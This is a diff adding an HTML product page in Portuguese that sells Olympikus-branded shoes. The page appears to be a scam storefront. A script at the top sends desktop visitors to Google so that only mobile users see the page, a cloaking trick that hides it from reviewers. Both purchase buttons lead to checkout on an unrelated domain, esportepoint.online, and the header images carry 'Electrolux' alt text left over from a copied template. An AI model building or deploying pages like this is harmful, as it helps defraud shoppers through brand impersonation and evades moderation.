@@ -1,0 +1,689 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Acesso Restrito</title>
+  <script>
+      // Código para verificar o dispositivo e redirecionar
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+      const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
+
+      if (!isMobile) {
+          // Redireciona para o Google se não for um dispositivo móvel
+          window.location.href = "https://www.google.com";
+      }
+  </script>
+  <script>
+  window.pixelId = "67b3d91bc14c57d451791d6b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Olympikus</title>
+
+  <link rel="stylesheet" href="css/swiper-bundle.min.css">
+  <style>
+    /* Estilos gerais */
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      padding-bottom: 60px; /* Espaço para o rodapé fixo */
+    }
+    .content-wrapper {
+      width: 100%;
+      overflow-x: hidden; /* Bloqueia o scroll horizontal */
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .header {
+      width: 100%;
+      height: auto;
+    }
+    /* Slider (exemplo para slides que estiverem sendo usados) */
+    .slider {
+      position: relative;
+      width: 100%;
+      overflow: hidden;
+    }
+    .slides {
+      display: flex;
+      transition: transform 0.5s ease-in-out;
+      width: 100%;
+    }
+    .slides img {
+      width: 100%;
+      height: auto;
+    }
+    #image-counter {
+      position: absolute;
+      bottom: 2px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: rgba(255, 255, 255, 0.7);
+      padding: 1px 10px;
+      border-radius: 10px;
+      font-size: 13px;
+      font-weight: bold;
+    }
+    /* Footer */
+    .footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background-color: #fff;
+      color: #000;
+      text-align: center;
+      padding: 10px;
+      font-size: 14px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 8vh;
+      box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.1);
+      box-sizing: border-box;
+    }
+    .footer .buy-button {
+      background-color: #000000;
+      color: white;
+      padding: 14px 130px;
+      text-decoration: none;
+      border-radius: 10px;
+      font-size: 11px;
+      font-weight: bold;
+      text-transform: uppercase;
+    }
+    /* Imagens adicionais */
+    .additional-image,
+    .additional-image3,
+    .additional-imagee {
+      width: 100%;
+      height: auto;
+      margin-top: 23px;
+    }
+    .additional-imagee {
+      margin-top: -23px;
+      margin-bottom: -15px;
+    }
+    /* Dropdown */
+    .dropdown {
+      position: relative;
+      display: inline-block;
+    }
+    .dropbtn {
+      background-color: #ffffff;
+      color: black;
+      margin: 10px 42px;
+      white-space: nowrap; 
+      padding: 8px 16px;
+      font-size: 14px;
+      border: 2px solid black;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background-color 0.3s;
+      display: inline-block;
+      margin-right: 20px;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .dropbtn::after {
+      content: '▼';
+      font-size: 10px;
+      margin-left: 10px;
+    }
+    .dropdown-content {
+      display: none;
+      position: absolute;
+      background-color: white;
+      min-width: 200px;
+      box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+      border-radius: 8px;
+      z-index: 1;
+    }
+    .dropdown-content a {
+      color: black;
+      padding: 16px;
+      text-decoration: none;
+      display: block;
+      transition: background-color 0.3s;
+    }
+    .dropdown-content a:hover {
+      background-color: #f1f1f1;
+    }
+    .dropdown:hover .dropdown-content {
+      display: block;
+    }
+    .dropdown:hover .dropbtn {
+      background-color: #e0e0e0;
+    }
+    /* Modal */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0,0,0,0.4);
+    }
+    .modal-content {
+      background-color: #fefefe;
+      margin: 15% auto;
+      padding: 20px;
+      border: 1px solid #888;
+      width: 80%;
+      max-width: 400px;
+      border-radius: 8px;
+      text-align: center;
+      position: relative;
+    }
+    .close {
+      color: #aaa;
+      float: right;
+      font-size: 28px;
+      font-weight: bold;
+    }
+    .close:hover,
+    .close:focus {
+      color: black;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .container {
+      text-align: center;
+      margin-top: 20px;
+      margin-bottom: 55px;
+    }
+    /* Fonte Cooper Hewitt */
+    @import url('https://fonts.googleapis.com/css2?family=Cooper+Hewitt:wght@100;200;300&display=swap');
+    /* Preço e textos */
+    .price-container {
+      text-align: left;
+      margin-bottom: 20px;
+    }
+    .product-price {
+      font-family: 'Cooper Hewitt', sans-serif;
+      font-size: 28px;
+      font-weight: bold;
+      color: #0033C6;
+      display: block;
+      margin-left: -50px;
+      margin-top: 1px;
+    }
+    .pix-text {
+      font-family: 'Cooper Hewitt', sans-serif;
+      font-size: 16px;
+      color: #9b9b9b;
+      display: block;
+      margin-bottom: 10px;
+      font-weight: bold;
+      margin-left: -50px;
+    }
+    .riscado-text {
+      font-family: 'Cooper Hewitt', sans-serif;
+      font-size: 14px;
+      color: #9b9b9b;
+      font-weight: bold;
+      margin-bottom: 5px;
+      text-align: left;
+      line-height: 1.2;
+      margin-left: -50px;
+    }
+    .riscado-text span {
+      text-decoration: line-through;
+    }
+    /* Botão "Comprar Agora" */
+    #checkoutButton {
+      background-color: #000000;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      padding: 12px 65px;
+      border-radius: 10px;
+      text-transform: uppercase;
+      transition: background-color 0.3s ease, color 0.3s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 83%;
+      border: none;
+      text-decoration: none;
+      margin-left: -50px;
+    }
+    #checkoutButton:hover {
+      background-color: #333;
+      color: white;
+    }
+    .buy-now-btn-icon {
+      margin-right: 10px;
+      display: flex;
+      align-items: center;
+    }
+    .buy-now-btn-text-add {
+      display: inline-block;
+    }
+    .buy-now-btn-spinner {
+      margin-left: 10px;
+    }
+    /* NEW STYLE – Swiper */
+    .swiper-container {
+      width: 80%;
+      max-width: 900px;
+      margin: auto;
+      overflow: hidden;
+    }
+    .swiper-wrapper {
+      display: flex;
+      transition: transform 0.3s ease;
+    }
+    .swiper-slide {
+      flex-shrink: 0;
+      width: 100%;
+    }
+    .main-slider .swiper-slide img {
+      width: 100%;
+      height: auto;
+      object-fit: cover;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      transition: transform 0.3s ease;
+    }
+    .main-slider .swiper-slide img:hover {
+      transform: scale(1.05);
+    }
+    .thumb-slider {
+      margin-top: 20px;
+    }
+    .thumb-slider .swiper-slide {
+      width: 18%;
+      cursor: pointer;
+    }
+    .thumb-slider .swiper-slide img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      border-radius: 8px;
+      border: 2px solid transparent;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      transition: border-color 0.3s, transform 0.3s ease;
+    }
+    .thumb-slider .swiper-slide-thumb-active img {
+      border-color: #007bff;
+      transform: scale(1.05);
+    }
+    .swiper-button-next, .swiper-button-prev {
+      color: #007bff;
+      width: 40px;
+      height: 40px;
+      background: rgba(255, 255, 255, 0.8);
+      border-radius: 50%;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      transition: background 0.3s;
+      margin-top: 33px;
+    }
+    .swiper-button-next:hover, .swiper-button-prev:hover {
+      background: #007bff;
+      color: #fff;
+    }
+    .swiper-button-next:after, .swiper-button-prev:after {
+      font-size: 16px;
+      font-weight: bold;
+    }
+    @media (max-width: 768px) {
+      /* Ajustes gerais para mobile */
+      .swiper-container {
+        width: 100%;
+      }
+      .thumb-slider .swiper-slide {
+        width: 25%;
+      }
+      /* Ajuste de margens e tamanhos de fontes */
+      .product-price {
+        font-size: 22px;
+        margin-left: 0;
+      }
+      .pix-text, .riscado-text {
+        font-size: 14px;
+        margin-left: 0;
+      }
+      #checkoutButton {
+        width: 90%;
+        padding: 12px;
+        margin-left: 0;
+        font-size: 14px;
+      }
+      .dropbtn {
+        margin: 10px 20px;
+        font-size: 12px;
+        padding: 6px 10px;
+      }
+    }
+    /* Size Selector */
+    .size-selector-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 50px;
+      position: relative;
+      width: 200px;
+    }
+    .size-selector {
+      background-color: white;
+      color: black;
+      padding: 10px 20px;
+      font-size: 16px;
+      border: 2px solid black;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s, color 0.3s;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      margin-bottom: 10px;
+    }
+    .size-selector:hover {
+      background-color: black;
+      color: white;
+    }
+    .size-options {
+      display: none;
+      position: absolute;
+      top: 50px;
+      left: 0;
+      background-color: white;
+      border: 2px solid black;
+      width: 100%;
+      z-index: 100;
+    }
+    .size-options label {
+      display: block;
+      padding: 10px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      border-bottom: 1px solid black;
+    }
+    .size-options label:last-child {
+      border-bottom: none;
+    }
+    .size-options label:hover {
+      background-color: lightgray;
+    }
+    .active .arrow {
+      transform: rotate(180deg);
+    }
+  </style>
+</head>
+<body>
+  <div class="content-wrapper">
+    <!-- Cabeçalho -->
+    <header>
+      <img alt="Cabeçalho Electrolux" class="header" src="images/1.jpg">
+      <img alt="Cabeçalho Electrolux" class="header" src="images/1111.jpg">
+      <img alt="Cabeçalho Electrolux" class="header" src="images/99.png">
+    </header>
+
+    <!-- Slider Principal (Swiper) -->
+    <div class="swiper-container main-slider">
+      <div class="swiper-wrapper">
+        <div class="swiper-slide">
+          <img src="images/1.webp" alt="Imagem 2">
+        </div>
+        <div class="swiper-slide">
+          <img src="images/2.webp" alt="Imagem 3">
+        </div>
+        <div class="swiper-slide">
+          <img src="images/3.webp" alt="Imagem 4">
+        </div>
+        <div class="swiper-slide">
+          <img src="images/4.webp" alt="Imagem 5">
+        </div>
+      </div>
+      <!-- Botões de Navegação -->
+      <div class="swiper-button-next"></div>
+      <div class="swiper-button-prev"></div>
+    </div>
+
+    <!-- Slider de Thumbnails -->
+    <div class="swiper-container thumb-slider">
+      <div class="swiper-wrapper">
+        <div class="swiper-slide">
+          <img src="images/1.webp" alt="Thumb 2">
+        </div>
+        <div class="swiper-slide">
+          <img src="images/2.webp" alt="Thumb 3">
+        </div>
+        <div class="swiper-slide">
+          <img src="images/3.webp" alt="Thumb 4">
+        </div>
+        <div class="swiper-slide">
+          <img src="images/4.webp" alt="Thumb 5">
+        </div>
+      </div>
+    </div>
+
+    <!-- Área de Botões, Preço e Tamanho -->
+    <div id="box-botoes-comprar">
+      <!-- Quantity Field -->
+      <input type="hidden" name="quantity" id="quantitySelected" value="1">
+
+      <script>
+        // Exemplo: Atualização do parcelamento (ajuste conforme a lógica do projeto)
+        document.getElementById("quantitySelected").addEventListener("change", function () {
+          const quantidade = document.getElementById("quantitySelected").value;
+          // Função updateParcelamento(quantidade) deve ser definida se necessária
+          // Atualize também outros elementos se necessário...
+        });
+      </script>
+
+      <!-- Preço do Produto -->
+      <div class="price-container">
+        <span id="precoRiscado" class="riscado-text"><span></span></span>
+        <span id="precoProduto" class="product-price"></span>
+        <span class="pix-text"></span>
+      </div>
+
+      <!-- Size Selector -->
+      <div class="size-selector-container">
+        <div class="size-selector" onclick="toggleOptions()">
+          <span id="selected-size">Selecione o Tamanho</span>
+          <span class="arrow">▼</span>
+        </div>
+        <div class="size-options">
+          <label onclick="selectSize(34)">34</label>
+          <label onclick="selectSize(35)">35</label>
+          <label onclick="selectSize(36)">36</label>
+          <label onclick="selectSize(37)">37</label>
+          <label onclick="selectSize(38)">38</label>
+          <label onclick="selectSize(39)">39</label>
+          <label onclick="selectSize(40)">40</label>
+          <label onclick="selectSize(41)">41</label>
+          <label onclick="selectSize(42)">42</label>
+          <label onclick="selectSize(43)">43</label>
+          <label onclick="selectSize(44)">44</label>
+        </div>
+      </div>
+
+      <!-- Botão de Checkout/Comprar Agora -->
+      <a id="checkoutButton" href="https://pay.esportepoint.online/checkout?product=10b48ec6-ece1-11ef-be25-46da4690ad53" onclick="redirectToCheckout()" class="buttonPressed add-to-cart-btn btn button-buy btn-block d-flex align-items-center justify-content-center animate__animated">
+        <span class="buy-now-btn-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" width="21" height="21" class="icon-bag mr-2" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M6 2L3 6v14c0 1.1.9 2 2 2h14a2 2 0 0 0 2-2V6l-3-4H6zM3.8 6h16.4M16 10a4 4 0 1 1-8 0"></path>
+          </svg>
+        </span>
+        <span class="buy-now-btn-text-add">Comprar Agora</span>
+        <span class="buy-now-btn-spinner spinner-border spinner-border-sm ml-2" role="status" aria-hidden="true" style="display: none;"></span>
+        <span class="buy-now-btn-text-loading" style="display: none;">Carregando...</span>
+      </a>
+    </div>
+
+    <!-- Imagens Adicionais -->
+    <p><img alt="Imagem adicional" class="additional-image" src="images/3.jpg"></p>
+    <p><img alt="Imagem adicional" class="additional-image" src="images/4.jpg"></p>
+    <p><img alt="Imagem adicional" class="additional-imagee" src="images/5.jpg"></p>
+    <p><img alt="Imagem adicional" class="additional-imagee" src="images/6.jpg"></p>
+
+    <!-- Modal -->
+    <div id="myModal" class="modal">
+      <div class="modal-content">
+        <span class="close" onclick="closeModal()">×</span>
+        <p id="modalMessage"></p>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer" id="footerDiv">
+      <a class="buy-button" id="buyButton1" href="https://pay.esportepoint.online/checkout?product=10b48ec6-ece1-11ef-be25-46da4690ad53" onclick="checkColor(event)">Comprar Agora</a>
+      <span id="colorWarning" class="warning-modal"></span>
+    </div>
+  </div> <!-- fim .content-wrapper -->
+
+  <!-- Scripts externos -->
+  <script src="js/swiper-bundle.min.js"></script>
+
+  <!-- Scripts personalizados -->
+  <script>
+    // Função para o slider com toque (se houver slides com classe .slides)
+    const slides = document.querySelector('.slides');
+    if (slides) {
+      const images = slides.querySelectorAll('img');
+      const imageCounter = document.getElementById('image-counter');
+      let currentIndex = 0;
+      const totalImages = images.length;
+      let startX, startY;
+      let isDragging = false;
+
+      function updateSlider() {
+        slides.style.transform = `translateX(${-currentIndex * 100}%)`;
+        if (imageCounter) {
+          imageCounter.textContent = `${currentIndex + 1} / ${totalImages}`;
+        }
+      }
+
+      function nextSlide() {
+        currentIndex = (currentIndex + 1) % totalImages;
+        updateSlider();
+      }
+
+      function prevSlide() {
+        currentIndex = (currentIndex - 1 + totalImages) % totalImages;
+        updateSlider();
+      }
+
+      slides.addEventListener('touchstart', (e) => {
+        startX = e.touches[0].clientX;
+        startY = e.touches[0].clientY;
+        isDragging = true;
+      });
+
+      slides.addEventListener('touchmove', (e) => {
+        if (!isDragging) return;
+        const currentX = e.touches[0].clientX;
+        const currentY = e.touches[0].clientY;
+        const diffX = startX - currentX;
+        const diffY = startY - currentY;
+
+        if (Math.abs(diffX) > Math.abs(diffY)) {
+          e.preventDefault();
+          if (diffX > 50) {
+            nextSlide();
+            isDragging = false;
+          } else if (diffX < -50) {
+            prevSlide();
+            isDragging = false;
+          }
+        }
+      });
+
+      slides.addEventListener('touchend', () => {
+        isDragging = false;
+      });
+
+      setInterval(nextSlide, 5000);
+      updateSlider();
+    }
+
+    // Funções para o dropdown de tamanho
+    function toggleOptions() {
+      const selector = document.querySelector('.size-selector');
+      const options = document.querySelector('.size-options');
+      options.style.display = (options.style.display === 'block') ? 'none' : 'block';
+      selector.classList.toggle('active');
+    }
+
+    function selectSize(size) {
+      const selectedSize = document.getElementById('selected-size');
+      const options = document.querySelector('.size-options');
+      selectedSize.textContent = 'Tamanho: ' + size;
+      options.style.display = 'none';
+      document.querySelector('.size-selector').classList.remove('active');
+    }
+
+    // Funções para o modal
+    function showModal(message) {
+      const modal = document.getElementById("myModal");
+      const modalMessage = document.getElementById("modalMessage");
+      modalMessage.textContent = message;
+      modal.style.display = "block";
+    }
+
+    function closeModal() {
+      document.getElementById("myModal").style.display = "none";
+    }
+
+    // Exemplo de função para validar a seleção de cor (ajuste conforme necessário)
+    function checkColor(event) {
+      // Se houver um dropdown de cor, valide se uma cor foi selecionada
+      const selectedColor = document.getElementById("dropdownButtonColor")?.textContent || "Cor";
+      if (selectedColor === "Cor") {
+        event.preventDefault();
+        showModal("Por favor, selecione uma cor antes de comprar.");
+        return false;
+      } else {
+        closeModal();
+        return true;
+      }
+    }
+
+    function redirectToCheckout() {
+      // Coloque aqui a lógica de redirecionamento, se necessário.
+      return true;
+    }
+
+    // Inicialização do Swiper
+    var thumbSlider = new Swiper('.thumb-slider', {
+      spaceBetween: 10,
+      slidesPerView: 4,
+      freeMode: true,
+      watchSlidesProgress: true,
+    });
+
+    var mainSlider = new Swiper('.main-slider', {
+      spaceBetween: 10,
+      slidesPerView: 1,
+      centeredSlides: true,
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+      thumbs: {
+        swiper: thumbSlider
+      },
+      simulateTouch: true,
+      touchRatio: 1,
+      touchAngle: 45,
+      loop: true,
+    });
+  </script>
+
+
+</body></html>
